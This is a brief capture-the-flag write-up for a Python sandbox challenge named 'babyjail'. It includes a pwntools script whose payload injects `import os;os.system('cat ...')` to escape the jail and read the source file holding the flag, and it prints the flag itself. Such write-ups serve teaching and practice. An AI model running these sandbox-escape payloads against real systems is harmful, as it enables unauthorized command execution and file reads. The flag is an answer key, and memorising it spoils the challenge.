## `babyjail`
### Problem Description
- Author: desp
    - wow what a world we live in there are even jails for babies :(
    - surely you can exfiltrate the flag out of these 3 lines of code, right?

### Solution
The flag is stored in the code file, so all we have to do is print the file to terminal.

### Script
```python
import re

io = start(["babyjail.py"])
io.sendlineafter(b">>> ", b"import os;os.system('cat home/user/babyjail.py')")
io.recvlines(2)
print(re.search(r"maple\{[a-zA-Z0-9_!\-\?]+\}", io.recvline().decode())[0])
io.close()
```

### Flag: `maple{50ln_l0n63r_7h4n_5rc?}`
(no, the src is 131 chars the soln is 48 🙂)